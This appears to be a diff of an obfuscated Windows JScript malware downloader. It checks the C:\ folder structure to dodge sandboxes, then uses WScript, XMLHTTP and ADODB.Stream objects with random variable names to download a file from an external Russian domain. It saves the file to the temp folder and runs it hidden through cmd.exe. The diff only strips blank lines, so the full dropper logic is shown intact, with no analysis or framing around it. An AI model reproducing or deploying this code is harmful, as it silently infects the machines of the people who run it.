@@ -1,39 +1,20 @@
 var ybdetof5 = new ActiveXObject("Scripting.FileSystemObject");
-
 if (new Function( "var inkezs3 = new Enumerator(ybdetof5.GetFolder('C:\\').SubFolders);  if(inkezs3.item(0).name.length > 1) return true; else return false;")()) {
-
 	hneneqil0 = this["WScript"];
-
 	istudyd7 = hneneqil0["CreateObject"]("Scripting.FileSystemObject");
-
 	lysfopdep3 = hneneqil0["CreateObject"]("WScript.Shell");
-
 	woqvybd3 = hneneqil0["CreateObject"]("MSXML2.XMLHTTP");
-
 	jucyzmum2 = hneneqil0["CreateObject"]("ADODB.Stream");
-
 	ihyxu0 = istudyd7["GetSpecialFolder"]("2");
-
 	ubujile0 = istudyd7["GetTempName"]();
-
 	fxejoplod6 = woqvybd3["open"]("GET", "http://kamennyigorod.ru/form.uio",  "0");
-
 	fxejoplod6 = woqvybd3["send"]();
-
 	jucyzmum2["type"] =  "1";
-
 	avolcuc7 = woqvybd3["ResponseBody"];
-
 	hnoqasann0 = hneneqil0["ScriptFullName"];
-
 	fxejoplod6 = jucyzmum2["Open"]();
-
 	fxejoplod6 = jucyzmum2["Write"](avolcuc7);
-
 	fxejoplod6 = jucyzmum2["SaveToFile"](ihyxu0 + ubujile0);
-
 	fxejoplod6 = jucyzmum2["Close"]();
-
 	fxejoplod6 = lysfopdep3["run"]("cmd.exe /c" + ihyxu0 + ubujile0,  "0");
-
 }10
